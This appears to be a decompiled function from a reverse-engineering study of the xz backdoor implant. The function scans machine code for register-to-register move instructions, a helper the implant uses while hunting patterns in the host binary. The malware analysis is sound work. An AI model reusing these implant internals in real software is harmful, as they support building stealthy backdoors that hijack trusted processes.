// /home/kali/xzre-ghidra/xzregh/10AC40_find_reg2reg_instruction.c
// Function: find_reg2reg_instruction @ 0x10AC40
// Calling convention: unknown
// Prototype: undefined find_reg2reg_instruction(void)


/*
 * AutoDoc: Searches a code range for register-to-register moves while enforcing CET-safe constraints. The implant uses it when it needs to follow pointer copies without touching memory operands during its pattern hunts.
 */
#include "xzre_types.h"


undefined8 find_reg2reg_instruction(ulong param_1,ulong param_2,long *param_3)

{
  int iVar1;
  uint uVar2;
  
  if (param_3 == (long *)0x0) {
    return 0;
  }
  while( TRUE ) {
    if ((param_2 <= param_1) || (iVar1 = x86_dasm(param_3,param_1,param_2), iVar1 == 0)) {
      return 0;
    }
    if (((((*(uint *)(param_3 + 5) & 0xfffffffd) == 0x109) ||
         ((uVar2 = *(uint *)(param_3 + 5) - 0x81, uVar2 < 0x3b &&
          ((0x505050500000505U >> ((byte)uVar2 & 0x3f) & 1) != 0)))) &&
        ((*(ushort *)(param_3 + 2) & 0xf80) == 0)) &&
       (((*(byte *)((long)param_3 + 0x1b) & 5) == 0 && (*(char *)((long)param_3 + 0x1d) == '\x03')))
       ) break;
    param_1 = param_3[1] + *param_3;
  }
  return 1;
}

